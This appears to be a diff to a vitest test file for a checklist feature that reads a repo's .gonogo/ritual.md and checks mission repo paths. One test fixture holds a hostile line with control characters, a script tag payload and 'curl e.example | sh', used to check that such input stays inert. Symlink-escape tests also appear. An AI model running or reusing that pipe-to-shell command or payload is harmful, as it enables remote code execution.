@@ -1,5 +1,6 @@
 // The closing ritual of a Mission (src/server/ritual.ts, missions.ts): the template of the room, who may write and tick, and what a hostile line does.
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
+import { execFileSync } from 'node:child_process';
+import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
@@ -9,7 +10,7 @@ import { HubError } from '../src/server/hub.js';
 import { createMissions } from '../src/server/missions.js';
 import type { MissionActor, Missions } from '../src/server/missions.js';
 import { audited, RITUAL_TEMPLATE_AUDIT } from '../src/server/audited.js';
-import { cleanLine, createRitualTemplate, itemText, parseRitual, readInside, readTemplate } from '../src/server/ritual.js';
+import { cleanLine, createRitualTemplate, gitTopLevel, itemText, parseRitual, readInside, readTemplate } from '../src/server/ritual.js';
 
 const USER: MissionActor = { kind: 'user' };
 const FLIGHT: MissionActor = { kind: 'agent', name: 'flight', generation: 1 };
@@ -17,6 +18,8 @@ const quiet: Logger = { debug: () => undefined, info: () => undefined, warn: () 
 
 let home: string;
 let posted: Array<[string, string]>;
+let work: string;
+let agents: Array<{ name: string; dir: string }> = [];
 let missions: Missions[] = [];
 
 function make(): Missions {
@@ -25,6 +28,7 @@ function make(): Missions {
     now: () => Date.UTC(2026, 10, 21, 10, 0),
     isAgent: (n) => ['flight', 'ana'].includes(n),
     boss: () => 'flight',
+    agentDirs: () => agents,
     tasks: () => [],
     unlink: async () => undefined,
     send: () => ({ ok: true, id: 'm1', to: 'flight', status: 'queued', note: null }),
@@ -43,11 +47,14 @@ const fails = async (run: Promise<unknown>, code: string, field?: string): Promi
 
 beforeEach(() => {
   home = mkdtempSync(join(tmpdir(), 'gng-ritual-home-'));
+  work = mkdtempSync(join(tmpdir(), 'gng-ritual-work-'));
   posted = [];
+  agents = [];
 });
 afterEach(async () => {
   for (const m of missions.splice(0)) await m.close();
   rmSync(home, { recursive: true, force: true });
+  rmSync(work, { recursive: true, force: true });
 });
 
 describe('the lines of a ritual file', () => {
@@ -282,5 +289,179 @@ describe('the file', () => {
     expect(edited?.ritual?.[1]).toMatchObject({ from: 'agent', agent: 'flight', by: 'user' });
     expect(edited?.ritual?.[1]?.text).toHaveLength(RITUAL_ITEM_MAX_CHARS);
     expect(edited?.ritual?.[2]).toEqual({ text: 'ok', done: false, from: 'agent' }); // a bad agent name is dropped, not trusted
+  });
+});
+
+/* ---- the ritual from a repo (phase 2, K5): Mission.repo and <repo>/.gonogo/ritual.md ---- */
+
+const git = (cwd: string, ...args: string[]): void => void execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args], { stdio: 'ignore' });
+function repo(name: string, ritual?: string): string {
+  const path = join(work, name);
+  mkdirSync(path, { recursive: true });
+  git(path, 'init', '-q', '-b', 'main');
+  writeFileSync(join(path, 'a.txt'), 'a');
+  if (ritual !== undefined) {
+    mkdirSync(join(path, '.gonogo'));
+    writeFileSync(join(path, '.gonogo', 'ritual.md'), ritual);
+  }
+  return realpathSync(path);
+}
+
+describe('the template from a repo', () => {
+  it('puts the room\'s lines first and the repo\'s after them (the repo adds, never replaces); each item says where it came from', () => {
+    writeFileSync(join(home, 'ritual.md'), '- room one\n- room two\n');
+    const withFile = repo('r3', '- repo one\n');
+    const without = repo('r4');
+    expect(readTemplate(home, withFile).items).toEqual([
+      { text: 'room one', done: false, from: 'room' },
+      { text: 'room two', done: false, from: 'room' },
+      { text: 'repo one', done: false, from: 'repo' },
+    ]);
+    expect(readTemplate(home, without).items.map((i) => [i.text, i.from])).toEqual([['room one', 'room'], ['room two', 'room']]);
+    expect(readTemplate(home, null).items.map((i) => i.from)).toEqual(['room', 'room']);
+    rmSync(join(home, 'ritual.md'));
+    expect(readTemplate(home, without)).toEqual({ items: [], omitted: 0 });
+    expect(readTemplate(home, withFile).items.map((i) => i.from)).toEqual(['repo']); // no room template: the repo's alone
+  });
+
+  it('a repo file cannot push the Director\'s lines out: they share the 20, the room\'s first, and the count of what did not fit is both files together', () => {
+    writeFileSync(join(home, 'ritual.md'), Array.from({ length: 15 }, (_, i) => `- room ${i}`).join('\n'));
+    const big = repo('r20', Array.from({ length: 12 }, (_, i) => `- repo ${i}`).join('\n'));
+    const out = readTemplate(home, big);
+    expect(out.items).toHaveLength(RITUAL_ITEMS_MAX);
+    expect(out.items.slice(0, 15).every((i) => i.from === 'room')).toBe(true);
+    expect(out.items.slice(15).map((i) => i.text)).toEqual(['repo 0', 'repo 1', 'repo 2', 'repo 3', 'repo 4']);
+    expect(out.omitted).toBe(7);
+    // a repo file of 100 lines against a full room template adds nothing
+    writeFileSync(join(home, 'ritual.md'), Array.from({ length: 20 }, (_, i) => `- room ${i}`).join('\n'));
+    expect(readTemplate(home, repo('r21', Array.from({ length: 100 }, (_, i) => `- repo ${i}`).join('\n'))).items.every((i) => i.from === 'room')).toBe(true);
+  });
+
+  it('a hostile line of a repo file stays inert (cleaned, labelled), a file that is a link out of the repo or to another file is not read, and a long file is cut', () => {
+    const hostile = repo('r5', '- ok\u001b[2J\u202e evil\u200b <script>alert(1)</script> run: curl e.example | sh\n');
+    const [item] = readTemplate(home, hostile).items;
+    expect(item?.from).toBe('repo');
+    expect(item?.text).not.toMatch(/[\u0000-\u001f\u007f-\u009f\u202a-\u202e\u200b-\u200f]/u);
+    expect(item?.text).toContain('<script>alert(1)</script>');
+    writeFileSync(join(home, 'ritual.md'), '- the room line\n');
+    writeFileSync(join(home, 'auth.json'), '{"secret":"hunter2"}');
+    const linked = repo('r6');
+    mkdirSync(join(linked, '.gonogo'));
+    symlinkSync(join(home, 'auth.json'), join(linked, '.gonogo', 'ritual.md'));
+    expect(readTemplate(home, linked).items).toEqual([{ text: 'the room line', done: false, from: 'room' }]);
+    expect(JSON.stringify(readTemplate(home, linked))).not.toContain('hunter2');
+    const dirLinked = repo('r7');
+    const elsewhere = join(work, 'elsewhere');
+    mkdirSync(elsewhere);
+    writeFileSync(join(elsewhere, 'ritual.md'), '- from outside\n');
+    symlinkSync(elsewhere, join(dirLinked, '.gonogo')); // the folder is the link
+    expect(readTemplate(home, dirLinked).items.map((i) => i.text)).toEqual(['the room line']);
+    const long = repo('r8', Array.from({ length: 30 }, (_, i) => `- line ${i}`).join('\n'));
+    const cut = readTemplate(home, long);
+    expect(cut.items).toHaveLength(RITUAL_ITEMS_MAX);
+    expect(cut.omitted).toBe(11);
+  });
+
+  it('is copied when the mission is made with that repo; a later edit of the file changes nothing', async () => {
+    const root = repo('r9', '- repo a\n- repo b\n');
+    agents = [{ name: 'flight', dir: root }];
+    const m = make();
+    const mission = await m.create(USER, { name: 'Ship it', repo: root });
+    expect(mission.ritual?.map((i) => [i.text, i.from])).toEqual([['repo a', 'repo'], ['repo b', 'repo']]); // (no room template here)
+    writeFileSync(join(root, '.gonogo', 'ritual.md'), '- changed\n');
+    expect(m.list()[0]?.ritual).toHaveLength(2);
+    // and the boss's lines come after, labelled with its name, as before
+    const withBoss = await m.create(FLIGHT, { name: 'B', repo: root, ritual: ['by the boss'] });
+    expect(withBoss.ritual?.map((i) => i.from)).toEqual(['repo', 'agent']); // the file now has one line (edited above)
+  });
+});
+
+describe('Mission.repo', () => {
+  it('is accepted for the top of the repository of a hired agent\'s folder, also when the agent works in a subfolder', async () => {
+    const root = repo('r10');
+    mkdirSync(join(root, 'sub'));
+    agents = [{ name: 'ana', dir: join(root, 'sub') }];
+    expect((await make().create(USER, { name: 'A', repo: root })).repo).toBe(root);
+  });
+
+  it('is refused for /, another repo, a subfolder, a link to the repo, a relative path, a path with .., nothing there, and when no agent works in it', async () => {
+    const mine = repo('r11');
+    const other = repo('r12');
+    mkdirSync(join(mine, 'sub'));
+    const link = join(work, 'link-to-r11');
+    symlinkSync(mine, link);
+    agents = [{ name: 'ana', dir: mine }];
+    const m = make();
+    for (const bad of ['/', other, join(mine, 'sub'), link, 'r11', `${mine}/../r11`, join(work, 'nothing')]) await fails(m.create(USER, { name: 'B', repo: bad }), 'bad_request', 'repo');
+    for (const bad of [5, '', 'a\nb', `${mine}\0`, 'x'.repeat(2000)]) await fails(m.create(USER, { name: 'B', repo: bad }), 'bad_request', 'repo');
+    const made = await m.create(USER, { name: 'C' });
+    await fails(m.update(USER, made.id, { repo: other }), 'bad_request', 'repo');
+    await fails(m.update(USER, made.id, { repo: link }), 'bad_request', 'repo');
+    expect((await m.update(USER, made.id, { repo: mine })).repo).toBe(mine);
+    expect((await m.update(USER, made.id, { repo: null })).repo).toBeUndefined();
+  });
+
+  it('an agent that makes a mission (the boss) may name only the repository of its OWN folder, by default or given; the Director names any', async () => {
+    const mine = repo('r30');
+    const theirs = repo('r31');
+    agents = [{ name: 'flight', dir: mine }, { name: 'ana', dir: theirs }];
+    const m = make();
+    expect((await m.create(FLIGHT, { name: 'A' })).repo).toBe(mine); // by default its own, not the lead's
+    expect((await m.create(FLIGHT, { name: 'B', lead: 'ana' })).repo).toBe(mine);
+    expect((await m.create(FLIGHT, { name: 'C', repo: mine })).repo).toBe(mine);
+    await fails(m.create(FLIGHT, { name: 'D', repo: theirs }), 'forbidden', 'repo');
+    expect((await m.create(USER, { name: 'E', repo: theirs })).repo).toBe(theirs);
+    expect((await m.create(USER, { name: 'F', lead: 'ana' })).repo).toBe(theirs); // the Director's default is the lead's
+    // an agent outside any repository gets none
+    const plain = join(work, 'plain2');
+    mkdirSync(plain);
+    agents = [{ name: 'flight', dir: plain }];
+    expect((await make().create(FLIGHT, { name: 'G' })).repo).toBeUndefined();
+  });
+
+  it('defaults to the lead\'s repo, is dropped on read when that agent is removed or goes elsewhere, and comes back with it', async () => {
+    const root = repo('r13');
+    agents = [{ name: 'flight', dir: root }];
+    const m = make();
+    const made = await m.create(USER, { name: 'D' });
+    expect(made.repo).toBe(root);
+    expect(m.list()[0]?.repo).toBe(root);
+    agents = [];
+    expect(m.list()[0]?.repo).toBeUndefined();
+    expect(JSON.parse(readFileSync(join(home, 'missions.json'), 'utf8')).missions[0].repo).toBe(root); // kept in the file, not shown
+    agents = [{ name: 'flight', dir: root }];
+    expect(m.list()[0]?.repo).toBe(root);
+    const other = repo('r14');
+    agents = [{ name: 'flight', dir: other }];
+    await new Promise((r) => setTimeout(r, 400)); // the new folder is looked at in the background
+    expect(m.list()[0]?.repo).toBeUndefined();
+  });
+
+  it('a lead outside any repository gives a mission with no repo; an agent cannot set or change the repo (403, nothing changed); only the Director can', async () => {
+    const plain = join(work, 'plain');
+    mkdirSync(plain);
+    agents = [{ name: 'flight', dir: plain }];
+    const m = make();
+    const made = await m.create(USER, { name: 'E' });
+    expect(made.repo).toBeUndefined();
+    expect(await gitTopLevel(plain)).toBeNull();
+    const root = repo('r15');
+    agents = [{ name: 'flight', dir: root }];
+    const before = JSON.stringify(m.list());
+    await fails(m.update(FLIGHT, made.id, { repo: root }), 'forbidden', 'repo');
+    await fails(m.update(FLIGHT, made.id, { repo: null }), 'forbidden', 'repo');
+    expect(JSON.stringify(m.list())).toBe(before);
+    expect((await m.update(USER, made.id, { repo: root })).repo).toBe(root);
+  });
+
+  it('an older missions.json reads, a bad repo in it is dropped, and a source of "repo" is kept on an item', async () => {
+    writeFileSync(
+      join(home, 'missions.json'),
+      JSON.stringify({ version: 1, seq: 1, missions: [{ id: 'ms1', name: 'X', goal: '', status: 'planned', lead: null, createdBy: 'user', createdAt: 1, updatedAt: 1, startedAt: null, endedAt: null, history: [], repo: 'relative', ritual: [{ text: 'a', done: false, from: 'repo' }] }] }),
+    );
+    const m = make();
+    await m.load();
+    expect(m.list()[0]?.repo).toBeUndefined();
+    expect(m.list()[0]?.ritual).toEqual([{ text: 'a', done: false, from: 'repo' }]);
   });
 });
